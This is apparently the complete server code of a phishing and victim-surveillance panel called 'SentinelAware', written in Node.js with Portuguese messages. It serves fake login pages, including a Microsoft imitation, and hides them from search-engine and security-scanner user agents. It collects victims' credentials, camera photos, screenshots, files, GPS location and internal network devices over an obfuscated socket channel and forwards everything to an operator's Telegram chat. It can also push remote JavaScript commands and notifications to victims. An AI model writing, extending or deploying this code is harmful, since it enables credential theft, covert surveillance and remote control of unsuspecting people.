const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const parser = require('user-agent-parser');
const axios = require('axios');
const fs = require('fs');
const cors = require('cors');
const webpush = require('web-push');
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { Pool } = require('pg');

const app = express();
app.use(cors());

// PostgreSQL Config
const pool = new Pool({
    host: process.env.DB_HOST,
    port: process.env.DB_PORT,
    user: process.env.DB_USER,
    password: process.env.DB_PASS,
    database: process.env.DB_NAME,
    ssl: false
});

// Telegram Config
const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TG_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const isProd = process.env.NODE_ENV === 'production' || process.env.VERCEL === '1';

let bot = null;
if (TG_TOKEN) {
    bot = new TelegramBot(TG_TOKEN, { polling: !isProd });
    console.log(`[TELEGRAM] Bot iniciado (${isProd ? 'Send-Only mode' : 'Polling mode'})`);
}

async function sendTelegramMsg(text) {
    if (!bot || !TG_CHAT_ID) return;
    try {
        await bot.sendMessage(TG_CHAT_ID, text, { parse_mode: 'Markdown' });
    } catch (e) {
        console.error('[TELEGRAM] Error sending message:', e.message);
    }
}

async function sendTelegramFile(buffer, filename, caption) {
    if (!bot || !TG_CHAT_ID) return;
    try {
        await bot.sendDocument(TG_CHAT_ID, buffer, { caption }, { filename });
    } catch (e) {
        console.error('[TELEGRAM] Error sending file:', e.message);
    }
}

async function sendTelegramPhoto(buffer, caption) {
    if (!bot || !TG_CHAT_ID) return;
    try {
        await bot.sendPhoto(TG_CHAT_ID, buffer, { caption });
    } catch (e) {
        console.error('[TELEGRAM] Error sending photo:', e.message);
    }
}

// Database Persistence Helpers
let links = [];
let logs = [];
let vapidKeys = null;

async function saveLink(link) {
    await pool.query('INSERT INTO links (id, data) VALUES ($1, $2) ON CONFLICT (id) DO UPDATE SET data = $2', [link.id, link]);
}

async function saveLog(log) {
    await pool.query('INSERT INTO logs (id, data) VALUES ($1, $2) ON CONFLICT (id) DO UPDATE SET data = $2', [log.id, log]);
}

async function loadInitialData() {
    try {
        const linksRes = await pool.query('SELECT data FROM links');
        links = linksRes.rows.map(r => r.data);

        const logsRes = await pool.query('SELECT data FROM logs');
        logs = logsRes.rows.map(r => r.data);

        const settingsRes = await pool.query('SELECT data FROM settings WHERE key = $1', ['vapid_keys']);
        if (settingsRes.rows.length > 0) {
            vapidKeys = settingsRes.rows[0].data;
        }

        if (!vapidKeys) {
            vapidKeys = webpush.generateVAPIDKeys();
            await pool.query('INSERT INTO settings (key, data) VALUES ($1, $2) ON CONFLICT (key) DO UPDATE SET data = $2', ['vapid_keys', vapidKeys]);
        }

        webpush.setVapidDetails('mailto:admin@sentinelaware.local', vapidKeys.publicKey, vapidKeys.privateKey);
        console.log('[DB] Dados carregados');
    } catch (err) {
        console.error('[DB] Erro ao carregar dados:', err.message);
    }
}

async function initDB() {
    try {
        console.log('[DB] Tentando conectar ao PostgreSQL...');
        const client = await pool.connect();
        console.log('[DB] Conexão estabelecida.');
        client.release();

        await pool.query(`
            CREATE TABLE IF NOT EXISTS links (id TEXT PRIMARY KEY, data JSONB NOT NULL);
            CREATE TABLE IF NOT EXISTS logs (id TEXT PRIMARY KEY, data JSONB NOT NULL);
            CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, data JSONB NOT NULL);
        `);
        console.log('[DB] Tabelas prontas');
        await loadInitialData();
    } catch (err) {
        console.error('[DB] ❌ Erro Crítico:', err.message);
        sendTelegramMsg(`❌ *ERRO DE BANCO DE DADOS*\n${err.message}`);
    }
}
initDB();

// --- CLOAKING MODULE ---
const suspiciousUA = ['googlebot', 'bingbot', 'lighthouse', 'paloalto', 'zscaler', 'headless'];
function cloakingMiddleware(req, res, next) {
    const ua = (req.headers['user-agent'] || '').toLowerCase();
    if (suspiciousUA.some(bot => ua.includes(bot))) {
        return res.redirect('https://pt.wikipedia.org/wiki/Seguran%C3%A7a_da_informa%C3%A7%C3%A3o');
    }
    next();
}

// Middleware Configuration
const publicPath = path.join(process.cwd(), 'public');
app.use(express.static(publicPath));
app.use(express.json());
app.use((req, res, next) => { res.setHeader('ngrok-skip-browser-warning', 'true'); next(); });

// Routes
app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'index.html')));
app.get('/api/vapid-public-key', (req, res) => res.json({ publicKey: vapidKeys ? vapidKeys.publicKey : null }));
app.post('/api/heartbeat', (req, res) => res.json({ status: 'active' }));

app.post('/api/links', async (req, res) => {
    const { template } = req.body;
    const id = Math.random().toString(36).substring(2, 10);
    const newLink = { id, url: `/t/${id}`, template: template || 'generic', createdAt: new Date(), clicks: 0 };
    links.push(newLink);
    await saveLink(newLink);
    res.json(newLink);
});

app.get('/t/:id', cloakingMiddleware, async (req, res) => {
    const link = links.find(l => l.id === req.params.id);
    if (link) {
        link.clicks++;
        await saveLink(link);
        const templateFile = `${link.template}.html`;
        const templatePath = path.join(publicPath, templateFile);
        
        if (fs.existsSync(templatePath)) {
            res.sendFile(templatePath);
        } else {
            console.log(`[SERVER] Template not found: ${templatePath}, falling back to microsoft.html`);
            res.sendFile(path.join(publicPath, 'microsoft.html'));
        }
    } else {
        res.sendFile(path.join(publicPath, 'microsoft.html'));
    }
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

io.on('connection', (socket) => {
    socket.on('telemetry_data', async (packet) => {
        try {
            const { event, data } = JSON.parse(Buffer.from(packet.v, 'base64').toString());
            const log = logs.find(l => l.id === data.logId);

            if (event === 'join') {
                const ip = (socket.handshake.headers['x-forwarded-for']?.split(',')[0] || socket.handshake.address).replace('::ffff:', '');
                if (!log) {
                    const newLog = { id: data.logId, linkId: data.linkId, timestamp: new Date(), ip, geo: 'Calculando...', creds: [], chat: [], threatLevel: 'green', status: 'online' };
                    logs.push(newLog);
                    await saveLog(newLog);
                    io.emit('new_click', newLog);
                    sendTelegramMsg(`🚨 *NOVO ALVO*\n🆔 ID: \`${newLog.id}\`\n🌍 IP: \`${newLog.ip}\``);
                } else {
                    log.status = 'online';
                    await saveLog(log);
                    io.emit('update_log', { id: log.id, status: 'online' });
                }
            } else if (log) {
                switch(event) {
                    case 'creds':
                        log.creds.push(data.value);
                        await saveLog(log);
                        io.emit('update_log', { id: log.id, creds: log.creds });
                        sendTelegramMsg(`🔑 *CAPTURA*\n🆔 ID: \`${log.id}\`\n📝: \`${data.value}\``);
                        break;
                    case 'photo':
                        log.photo = data.image;
                        await saveLog(log);
                        const photoBuf = Buffer.from(data.image.split(',')[1], 'base64');
                        sendTelegramPhoto(photoBuf, `📸 *FOTO* - ID: ${log.id}`);
                        break;
                    case 'screenshot':
                        log.screenshot = data.image;
                        await saveLog(log);
                        const scrBuf = Buffer.from(data.image.split(',')[1], 'base64');
                        sendTelegramPhoto(scrBuf, `🖥️ *SCREENSHOT* - ID: ${log.id}`);
                        break;
                    case 'file_up':
                        if(!log.files) log.files = [];
                        log.files.push(data);
                        await saveLog(log);
                        const fileBuf = Buffer.from(data.content.split(',')[1], 'base64');
                        sendTelegramFile(fileBuf, data.name, `📂 *ARQUIVO* - ID: ${log.id}`);
                        break;
                    case 'geo':
                        log.lat = data.lat; log.lon = data.lon; log.geo = `Precise: ${data.lat},${data.lon}`;
                        await saveLog(log);
                        sendTelegramMsg(`📍 *GPS* - ID: ${log.id}\nhttps://www.google.com/maps?q=${data.lat},${data.lon}`);
                        break;
                    case 'js_result':
                        io.emit('js_result_admin', data);
                        break;
                    case 'network':
                        log.internalDevices = data.devices;
                        await saveLog(log);
                        sendTelegramMsg(`📡 *REDE* - ID: ${log.id}\n${data.devices.join(', ')}`);
                        break;
                    case 'fingerprint':
                        log.fingerprint = data.fingerprint;
                        await saveLog(log);
                        sendTelegramMsg(`📂 *DOSSIÊ* - ID: ${log.id}\nOS: ${data.fingerprint.platform}`);
                        break;
                }
            }
        } catch(e) {}
    });

    socket.on('remote_command', (d) => io.emit('execute_command', d));
    socket.on('admin_send_chat', (d) => io.emit('victim_recv_chat', d));
    socket.on('admin_send_push', (d) => {
        const log = logs.find(l => l.id === d.id);
        if (log && log.subscription) webpush.sendNotification(log.subscription, JSON.stringify(d));
    });
});

app.get('/api/logs', (req, res) => res.json(logs));
app.get('/api/links', (req, res) => res.json(links));
app.delete('/api/logs', async (req, res) => { logs = []; await pool.query('DELETE FROM logs'); res.json({ success: true }); });

const PORT = process.env.PORT || 3000;
if (!process.env.VERCEL) {
    server.listen(PORT, () => {
        console.log(`[SERVER] SentinelAware rodando na porta ${PORT}`);
        sendTelegramMsg(`🚀 *SERVIDOR INICIADO*\nHost: \`Local/Ngrok\`\nPorta: \`${PORT}\``);
    });
}

module.exports = app;
